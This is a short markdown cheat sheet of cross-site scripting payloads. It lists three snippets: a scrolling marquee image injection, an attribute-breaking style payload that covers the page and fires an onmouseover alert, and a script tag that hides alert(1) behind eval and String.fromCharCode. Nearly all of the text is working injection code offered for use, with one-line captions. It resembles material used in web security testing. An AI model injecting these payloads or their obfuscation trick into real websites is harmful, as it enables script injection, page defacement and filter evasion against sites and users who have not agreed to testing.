# XSS payloads

```<marquee behavior="scroll" direction="left"><img src="<put image here>" width=“800” height=“600” alt="Natural" /></marquee>```

Scrolling marquee continuous

```style=width: 10000px; height: 10000px; position: absolute; top: 0; left: 0; z-index: 99999999" onmouseover=alert(0) ```

On mouse over that covers page by @landaire

```<script>eval(String.fromCharCode(97,108,101,114,116,40,39,49,39,41))</script> ```

Using eval and String.fromCharCode to encode/obfuscate alert(1). Converter can be found [here](http://www.binaryhexconverter.com/ascii-text-to-decimal-converter)
